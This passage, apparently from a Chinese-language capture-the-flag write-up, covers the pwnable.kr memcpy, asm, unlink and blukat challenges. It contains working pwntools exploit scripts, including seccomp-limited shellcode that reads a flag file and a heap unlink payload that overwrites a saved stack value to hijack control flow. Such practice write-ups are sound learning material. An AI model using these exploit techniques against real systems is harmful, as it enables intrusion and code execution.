<p>Moves the packed double-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed double-precision, floating-pointing data. The destination operand is a 128-bit, 256-bit or 512-bit memory location. <strong>The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</strong></p>
</blockquote>
<p>&#x8981;&#x6C42;16&#x4F4D;&#x5BF9;&#x9F50;</p>
<p>&#x89C2;&#x5BDF;malloc&#x8FC7;&#x7A0B;</p>
<blockquote>
<p>malloc&#x5728;&#x5206;&#x914D;&#x5185;&#x5B58;&#x65F6;&#x5B83;&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x4F1A;&#x591A;&#x5206;&#x914D;4&#x5B57;&#x8282;&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x5806;&#x5757;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x5206;&#x914D;a&#x5B57;&#x8282;&#x5B9E;&#x9645;&#x4E0A;&#x5206;&#x914D;&#x7684;&#x662F;a+4&#x5B57;&#x8282;&#x3002;&#x53E6;&#x5916;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0A;&#x8BE5;&#x51FD;&#x6570;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x662F;&#x4EE5;8&#x5B57;&#x8282;&#x5BF9;&#x9F50;&#x7684;&#x3002;</p>
</blockquote>
<p>&#x6709;&#x4E86;&#x8FD9;&#x4E24;&#x70B9;&#x5C31;&#x77E5;&#x9053;&#x7A0B;&#x5E8F;&#x7684;&#x5F02;&#x5E38;&#x9000;&#x51FA;&#x662F;&#x56E0;&#x4E3A;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x6CA1;&#x6709;16&#x5B57;&#x8282;&#x5BF9;&#x9F50;&#xFF0C;&#x90A3;&#x4E48;&#x8981;&#x8BA9;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FDB;&#x884C;&#x62FF;&#x5230;flag&#x53EA;&#x9700;&#x8981;&#x6BCF;&#x6B21;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;&#x80FD;&#x591F;&#x88AB;16&#x6574;&#x9664;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</p>
<p>&#xFF08;&#x5B9E;&#x9645;&#x4E0A;&#x7531;&#x4E8E;malloc&#x51FD;&#x6570;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;8&#x5B57;&#x8282;&#x5BF9;&#x9F50;&#xFF0C;&#x53EA;&#x8981;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x9664;&#x4EE5;16&#x7684;&#x4F59;&#x6570;&#x5927;&#x4E8E;9&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#xFF09;&#x3002;</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level = <span class="hljs-string">&apos;DEBUG&apos;</span>

shell = ssh(host=<span class="hljs-string">&quot;pwnable.kr&quot;</span>,user=<span class="hljs-string">&quot;memcpy&quot;</span>,port=<span class="hljs-number">2222</span>,password=<span class="hljs-string">&quot;guest&quot;</span>)
io = shell.connect_remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">9022</span>)
<span class="hljs-comment">#io=process(&quot;./memcpy&quot;)</span>
io.recvuntil(<span class="hljs-string">&quot;specify the memcpy amount between 8 ~ 16 :&quot;</span>)
io.sendline(<span class="hljs-string">&apos;8&apos;</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):
    payload = str(pow(<span class="hljs-number">2</span>, i+<span class="hljs-number">4</span>)+<span class="hljs-number">10</span>)
    io.sendlineafter(<span class="hljs-string">&apos;: &apos;</span>, payload)
io.interactive()
</code></pre>
<h2 id="0x12-shellcode"><a name="0x12-shellcode" class="anchor-navigation-ex-anchor" href="#0x12-shellcode"><i class="fa fa-link" aria-hidden="true"></i></a>0x12 shellcode</h2>
<p>stub&#x4E2D;&#x7684;&#x5185;&#x5BB9;</p>
<pre><code>python
&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt; print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;)
   0:   48                      dec    eax
   1:   31 c0                   xor    eax, eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx, ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx, ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx, edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi, esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi, edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp, ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax, eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx, ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx, edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx, ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp, esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp, ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi, esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi, edi
</code></pre><p>&#x5C06;&#x6240;&#x6709;&#x5BC4;&#x5B58;&#x5668;&#x6E05;&#x96F6;</p>
<p>&#x5BF9;&#x6211;&#x4EEC;&#x5199;shellcode&#x770B;&#x8D77;&#x6765;&#x6CA1;&#x6709;&#x5565;&#x5F71;&#x54CD;</p>
<p>&#x6CE8;&#x610F;&#x5230;&#x6E90;&#x7801;&#x5BF9;&#x53EF;&#x7528;&#x7684;&#x6307;&#x4EE4;&#x505A;&#x4E86;&#x9650;&#x5236;</p>
<pre><code>    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
</code></pre><p>&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#x3002;&#x3002;&#x3002;</p>
<p>&#x53EF;&#x4EE5;&#x5229;&#x7528;pwntool&#x7684;shellcraft&#x6765;&#x5FEB;&#x901F;&#x7F16;&#x5199;shellcode</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;Linux&quot;</span>,log_level=<span class="hljs-string">&quot;DEBUG&quot;</span>)

shell = ssh(host=<span class="hljs-string">&quot;pwnable.kr&quot;</span>,user=<span class="hljs-string">&quot;asm&quot;</span>,port=<span class="hljs-number">2222</span>,password=<span class="hljs-string">&quot;guest&quot;</span>)
<span class="hljs-comment">#shell.download_file(&quot;./asm.c&quot;)</span>

io = shell.connect_remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">9026</span>)
filename=<span class="hljs-string">&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;</span>
shellcode=<span class="hljs-string">&quot;&quot;</span>
shellcode+=shellcraft.open(filename)<span class="hljs-comment">#&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x5230; rax(&#x8FD4;&#x56DE;&#x503C;)</span>
shellcode+=shellcraft.read(<span class="hljs-string">&apos;rax&apos;</span>,<span class="hljs-string">&apos;rsp&apos;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#&#x8BFB;&#x6587;&#x4EF6; 100&#x4E2A;&#x5B57;&#x8282; &#x5230;&#x6808;&#x4E0A; (rsp)</span>
shellcode+=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&apos;rsp&apos;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#&#x4ECE;rsp &#x5199;&#x5230;stdout=1 (stdin=0) </span>
<span class="hljs-keyword">print</span> shellcode
io.sendafter(<span class="hljs-string">&quot;give me your x64 shellcode:&quot;</span>,asm(shellcode))
io.interactive()
</code></pre>
<p>&#x9644;&#x4E00;&#x5F20;x64&#x5404;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x9014;</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>&#x72B6;&#x6001;</th>
<th>&#x8BF7;&#x4F7F;&#x7528;</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>RAX</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x8FD4;&#x56DE;&#x503C;&#x5BC4;&#x5B58;&#x5668;</strong></td>
</tr>
<tr>
<td><strong>RCX</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E00;&#x4E2A;&#x6574;&#x578B;&#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>RDX</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E8C;&#x4E2A;&#x6574;&#x578B;&#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>R8</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E09;&#x4E2A;&#x6574;&#x578B;&#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>R9</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x56DB;&#x4E2A;&#x6574;&#x578B;&#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>R10:R11</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x6839;&#x636E;&#x9700;&#x8981;&#x7531;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;&#xFF1B;&#x5728; syscall/sysret &#x6307;&#x4EE4;&#x4E2D;&#x4F7F;&#x7528;</strong></td>
</tr>
<tr>
<td><strong>R12:R15</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>RDI</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>RSI</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>RBX</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>RBP</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x53EF;&#x7528;&#x4F5C;&#x5E27;&#x6307;&#x9488;&#xFF1B;&#x5FC5;&#x987B;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>RSP</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5806;&#x6808;&#x6307;&#x9488;</strong></td>
</tr>
<tr>
<td><strong>XMM0</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E00;&#x4E2A; FP &#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>XMM1</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E8C;&#x4E2A; FP &#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>XMM2</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x4E09;&#x4E2A; FP &#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>XMM3</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x7B2C;&#x56DB;&#x4E2A; FP &#x53C2;&#x6570;</strong></td>
</tr>
<tr>
<td><strong>XMM4:XMM5</strong></td>
<td><strong>&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x6839;&#x636E;&#x9700;&#x8981;&#x7531;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;</strong></td>
</tr>
<tr>
<td><strong>XMM6:XMM15</strong></td>
<td><strong>&#x975E;&#x6613;&#x5931;&#x7684;</strong></td>
<td><strong>&#x5FC5;&#x987B;&#x6839;&#x636E;&#x9700;&#x8981;&#x7531;&#x88AB;&#x8C03;&#x7528;&#x65B9;&#x4FDD;&#x7559;&#x3002;</strong></td>
</tr>
</tbody>
</table>
<h2 id="0x13-unlink"><a name="0x13-unlink" class="anchor-navigation-ex-anchor" href="#0x13-unlink"><i class="fa fa-link" aria-hidden="true"></i></a>0x13 unlink</h2>
<p>&#x8003;&#x5BDF;&#x5806;&#x6EA2;&#x51FA;&#x548C;DWORD SHOOT&#x64CD;&#x4F5C;</p>
<h3 id="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;-dword-shoot"><a name="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;-dword-shoot" class="anchor-navigation-ex-anchor" href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;-dword-shoot"><i class="fa fa-link" aria-hidden="true"></i></a>&#x524D;&#x7F6E;&#x77E5;&#x8BC6; DWORD SHOOT</h3>
<p><a href="../assets/images/remove_node.jpg" data-lightbox="e01e2583-27fb-49ad-9800-4eedd474302f" data-title="&#x5378;&#x8F7D;&#x7ED3;&#x70B9;&#x7684;&#x8FC7;&#x7A0B;&#x56FE;"><img src="../assets/images/remove_node.jpg" alt="&#x5378;&#x8F7D;&#x7ED3;&#x70B9;&#x7684;&#x8FC7;&#x7A0B;&#x56FE;"></a></p>
<p>unlink&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x64CD;&#x4F5C;&#x793A;&#x610F;&#x56FE;</p>
<pre><code class="lang-c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlink</span><span class="hljs-params">(OBJ* P)</span></span>{
    OBJ* BK;
    OBJ* FD;
    BK=P-&gt;bk;<span class="hljs-comment">//&#x5982;&#x679C;bk&#x5DF2;&#x7ECF;&#x88AB;&#x6076;&#x610F;&#x8986;&#x76D6;&#x4E86;&#x5462; &#x6BD4;&#x5982;&#x4E00;&#x4E2A;4&#x5B57;&#x8282;&#x7684;&#x6076;&#x610F;&#x6570;&#x636E;</span>
    FD=P-&gt;fd;<span class="hljs-comment">//&#x5982;&#x679C;fd&#x5DF2;&#x7ECF;&#x88AB;&#x6076;&#x610F;&#x8986;&#x76D6;&#x4E86;&#x5462; &#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
    FD-&gt;bk=BK;<span class="hljs-comment">//&#x90A3;&#x4E48;FD&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#x7684;bk&#x4F1A;&#x88AB;BK&#x7684;&#x6076;&#x610F;&#x6570;&#x636E;&#x8986;&#x76D6;</span>
    BK-&gt;fd=FD;
}
</code></pre>
<p><a href="../assets/images/dword_shoot.jpg" data-lightbox="f24b25d6-3e3e-4030-b7d1-14e6b5b65c20" data-title="DWORD SHOOT&#x53D1;&#x751F;&#x7684;&#x539F;&#x7406;"><img src="../assets/images/dword_shoot.jpg" alt="DWORD SHOOT&#x53D1;&#x751F;&#x7684;&#x539F;&#x7406;"></a></p>
<p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x62FF;&#x5230;shell&#x540E;&#x95E8;&#x7684;&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x4E0D;&#x96BE;&#x60F3;&#x5230;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; FD-&gt;bk=BK &#x5C06; shell &#x51FD;&#x6570;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x5199;&#x5230;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x4E0A;</p>
<pre><code class="lang-c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlink</span><span class="hljs-params">(OBJ* P)</span></span>{
    OBJ* BK;
    OBJ* FD;
    BK=P-&gt;bk;<span class="hljs-comment">//bk&#x662F;shell&#x7684;&#x5730;&#x5740;</span>
    FD=P-&gt;fd;
    FD-&gt;bk=BK;<span class="hljs-comment">//&#x90A3;&#x4E48;FD&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#x7684;bk&#x4F1A;&#x88AB;BK&#x7684;&#x6076;&#x610F;&#x6570;&#x636E;&#x8986;&#x76D6;</span>
    BK-&gt;fd=FD;<span class="hljs-comment">//&#x4F46;&#x662F;BK(shell)&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x5728;&#x6B64;&#x5904;&#x88AB;&#x8986;&#x76D6;</span>
}
</code></pre>
<p>&#x5982;&#x679C;&#x662F;&#x5229;&#x7528;&#x5806;&#x6EA2;&#x51FA;&#x6307;&#x5411;&#x5806;&#x4E0A;&#x7684;&#x4E00;&#x6BB5;shellcode</p>
<p>checksec&#x53D1;&#x73B0;&#x7A0B;&#x5E8F;&#x6709;NX&#x4FDD;&#x62A4;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x770B;&#x5927;&#x4F6C;&#x7684;wp&#x627E;&#x5230;&#x4E00;&#x70B9;&#x601D;&#x8DEF;</p>
<p>&#x5728;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#x7684;&#x6700;&#x540E;&#x4E00;&#x6BB5;</p>
<pre><code class="lang-assembly">.text:080485FF                 mov     ecx, [ebp+var_4]
.text:08048602                 leave
.text:08048603                 lea     esp, [ecx-4]
.text:08048606                 retn
</code></pre>
<blockquote>
<p>retn&#x6307;&#x4EE4;&#x76F8;&#x5F53;&#x4E8E;<strong>pop eip</strong>&#xFF0C;&#x8BE5;&#x6307;&#x4EE4;&#x662F;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x6D41;&#x7A0B;&#x7684;&#xFF0C;&#x6D41;&#x7A0B;&#x7684;&#x6765;&#x6E90;&#x662F;esp&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#x3002;</p>
<p>&#x800C;&#x518D;&#x4E4B;&#x524D; lea esp&#xFF0C;[ecx-4]&#x5373;&#x628A;ecx-4&#x5730;&#x5740;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8D4B;&#x7ED9;esp&#x3002;</p>
<p>&#x800C;&#x5728;&#x6B64;&#x9006;&#x63A8;ecx&#x7684;&#x503C;&#x662F;&#x4ECE;mov ecx,[ebp-4]&#x4E2D;&#x5F97;&#x5230;&#x7684;&#x3002;</p>
<p>&#x800C;leave&#x6307;&#x4EE4;&#x76F8;&#x5F53;&#x4E8E;mov esp ebp&#xFF0C;pop ebp&#xFF0C;&#x5BF9;esp&#x6570;&#x636E;&#x7684;&#x6765;&#x6E90;&#x65E0;&#x5F71;&#x54CD;&#x3002;</p>
<p>ebp&#x5728;&#x6574;&#x4E2A;main&#x51FD;&#x6570;&#x8FD0;&#x884C;&#x4E2D;&#x662F;&#x4E0D;&#x53D8;&#x7684;&#x3002;</p>
<p>&#x56E0;&#x6B64;&#xFF0C;&#x53EF;&#x4EE5;&#x6784;&#x9020; [ecx-4] = shell&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;</p>
<p>&#x8FD9;&#x6837; &#x5C31;&#x53EF;&#x4EE5;&#x5148;&#x628A; shell&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x5199;&#x5230;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x5730;&#x5740;&#xFF08;&#x5982;&#x53EF;&#x4EE5;&#x5728;A-&gt;buf&#x7684;&#x8D77;&#x59CB;&#x90E8;&#x5206;&#x8F93;&#x5165;shell&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF09;&#xFF0C;ecx&#x518D;&#x6307;&#x5411;&#x8BE5;&#x5730;&#x5740;+4.</p>
<p>&#x8FDB;&#x4E00;&#x6B65;&#x5C31;&#x662F;&#x5C06;ebp-4&#x5730;&#x5740;&#x4E2D;&#x7684;&#x503C;&#x8986;&#x5199;&#x6210;&#x4E0A;&#x9762;&#x7684;&#x5730;&#x5740;+4.</p>
</blockquote>
<p>&#x5927;&#x81F4;&#x5C31;&#x662F;&#x5229;&#x7528;unlink&#x5BF9;&#x5730;&#x5740;[ecx-4]&#x8FDB;&#x884C;&#x4EFB;&#x610F;&#x5199;&#xFF08;shell&#xFF09;</p>
<p>&#x7136;&#x540E;retn&#x7684;&#x65F6;&#x5019;&#x5229;&#x7528;</p>
<p>A,B,C&#x5728;&#x6808;&#x4E0A;&#x7684;&#x4F4D;&#x7F6E;&#x53EF;&#x4ECE;ida&#x4E2D;&#x770B;&#x51FA;</p>
<pre><code class="lang-c">A <span class="hljs-comment">// [esp+4h] [ebp-14h]</span>
B <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span>
C <span class="hljs-comment">// [esp+8h] [ebp-10h]</span>
</code></pre>
<p>ebp&#x53EF;&#x4EE5;&#x4ECE;&#x6C47;&#x7F16;&#x4EE3;&#x7801;&#x4E2D;&#x7B97;&#x51FA;</p>
<pre><code class="lang-asm">.text:08048555                 call    _malloc
.text:0804855A                 add     esp, 10h
.text:0804855D                 mov     [ebp+var_14], eax
</code></pre>
<p>&#x7ED3;&#x5408;&#x53CD;&#x6C47;&#x7F16;&#x5F97;&#x5230;&#x7684;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5F97;&#x5230;</p>
<p>ebp-0x14=&amp;A=stack_addr</p>
<p>&#x8FD9;&#x6837;&#x5982;&#x4F55;&#x89E3;&#x51B3;&#x4E4B;&#x524D;&#x7684;&#x8986;&#x76D6;&#x95EE;&#x9898;&#x5462;</p>
<p>&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x662F;</p>
<p>&#x5F53;BK = ebp-4&#x65F6;&#xFF0C;FD + 4 = shell +4 &#xFF0C;FD = shell,  &#x8986;&#x5199;&#x65F6;&#xFF0C;[shell+4] = ebp-4</p>
<pre><code class="lang-c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlink</span><span class="hljs-params">(OBJ* P)</span></span>{
    OBJ* BK;
    OBJ* FD;
    BK=P-&gt;bk;<span class="hljs-comment">//bk&#x662F;[ebp-4]=[ebp-4] &#x4E5F;&#x5373; stack_addr+0x14-0x4</span>
    FD=P-&gt;fd;<span class="hljs-comment">//fd&#x6307;&#x5411;ecx=(shell_addr+4) &#x4E5F;&#x5373; (heap_addr+0x8)+0x4</span>
    FD-&gt;bk=BK;<span class="hljs-comment">//&#x6B64;&#x65F6;FD-&gt;bk=ecx+4 &#x65E0;&#x5F71;&#x54CD;</span>
    BK-&gt;fd=FD;<span class="hljs-comment">//&#x6B64;&#x65F6;BK-&gt;fd=ecx=(shell_addr+4)</span>
}
</code></pre>
<h3 id="exp_4"><a name="exp_4" class="anchor-navigation-ex-anchor" href="#exp_4"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(arch=<span class="hljs-string">&apos;amd64&apos;</span>,os=<span class="hljs-string">&apos;linux&apos;</span>,log_level=<span class="hljs-string">&quot;DEBUG&quot;</span>)

shell=ssh(host=<span class="hljs-string">&apos;pwnable.kr&apos;</span>,user=<span class="hljs-string">&apos;unlink&apos;</span>,password=<span class="hljs-string">&apos;guest&apos;</span>,port=<span class="hljs-number">2222</span>)

<span class="hljs-comment">#shell.download_file(&quot;./unlink.c&quot;)</span>
<span class="hljs-comment">#shell.download_file(&quot;./unlink&quot;)</span>

io=shell.run(<span class="hljs-string">&quot;./unlink&quot;</span>)

shell_addr=<span class="hljs-number">0x080484EB</span>

re=io.recvline()
stack_addr=int(re.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># &amp;A</span>
re=io.recvline()
heap_addr=int(re.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) <span class="hljs-comment"># A</span>
io.recvline()

<span class="hljs-string">&apos;&apos;&apos;
typedef struct tagOBJ{
    struct tagOBJ* fd;//4 byte
    struct tagOBJ* bk;//4 byte
    char buf[8];//8 byte
}OBJ;
&apos;&apos;&apos;</span>

payload = p32(shell_addr)<span class="hljs-comment">#(A-&gt;buf(0~3))</span>
payload +=<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">0x4</span>+<span class="hljs-number">0x8</span>)<span class="hljs-comment">#(A-&gt;buf(4~7)+padding(0x08))</span>
payload += p32(heap_addr+<span class="hljs-number">0x8</span>+<span class="hljs-number">0x4</span>)<span class="hljs-comment">#(B-&gt;fd)</span>
payload += p32(stack_addr+<span class="hljs-number">0x14</span><span class="hljs-number">-0x4</span>)<span class="hljs-comment">#(B-&gt;bk)</span>

<span class="hljs-comment">#print hex(stack_addr)+&quot; &quot;+hex(heap_addr)</span>

io.send(payload)
io.interactive()
</code></pre>
<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;</h3>
<p><a href="https://bbs.pediy.com/thread-247883.htm" target="_blank">https://bbs.pediy.com/thread-247883.htm</a></p>
<p><a href="https://introspelliam.github.io/2017/06/26/0day/&#x5806;&#x6EA2;&#x51FA;&#x5229;&#x7528;&#xFF08;&#x4E0A;&#xFF09;&#x2014;&#x2014;DWORD-SHOOT/" target="_blank">https://introspelliam.github.io/2017/06/26/0day/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94DWORD-SHOOT/</a></p>
<p><a href="https://www.cnblogs.com/p4nda/p/7172104.html" target="_blank">https://www.cnblogs.com/p4nda/p/7172104.html</a></p>
<p><a href="https://blog.csdn.net/Apollon_krj/article/details/51302859" target="_blank">https://blog.csdn.net/Apollon_krj/article/details/51302859</a></p>
<h2 id="0x14-blukat"><a name="0x14-blukat" class="anchor-navigation-ex-anchor" href="#0x14-blukat"><i class="fa fa-link" aria-hidden="true"></i></a>0x14 blukat</h2>
<p>&#x597D;&#x7EDD;&#x4E00;&#x9898;</p>
<p>&#x5206;&#x6790;&#x6E90;&#x7801;&#x53D1;&#x73B0;&#x6CA1;&#x6709;&#x6EA2;&#x51FA;&#x70B9;&#xFF0C;&#x96BE;&#x9053;&#x771F;&#x7684;&#x53EA;&#x80FD;&#x7206;&#x7834;password?</p>
<p>&#x7136;&#x540E;ls -al &#x770B;&#x4E86;&#x4E00;&#x4E0B;</p>
<pre><code>blukat@prowl:~$ ls -al
total 36
drwxr-x---   4 root blukat     4096 Aug 16  2018 .
drwxr-xr-x 116 root root       4096 Nov 12 21:34 ..
-r-xr-sr-x   1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r--   1 root root        645 Aug  8  2018 blukat.c
dr-xr-xr-x   2 root root       4096 Aug 16  2018 .irssi
-rw-r-----   1 root blukat_pwn   33 Jan  6  2017 password
drwxr-xr-x   2 root root       4096 Aug 16  2018 .pwntools-cache
</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230; password&#x662F;&#x53EF;&#x8BFB;&#x7684;&#x3002;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x56DE;&#x663E;&#x5BFC;&#x81F4;&#x4E00;&#x5F00;&#x59CB;&#x6839;&#x672C;&#x6CA1;&#x53BB;&#x60F3;&#x3002;&#x3002;&#x3002;&#x3002;</p>
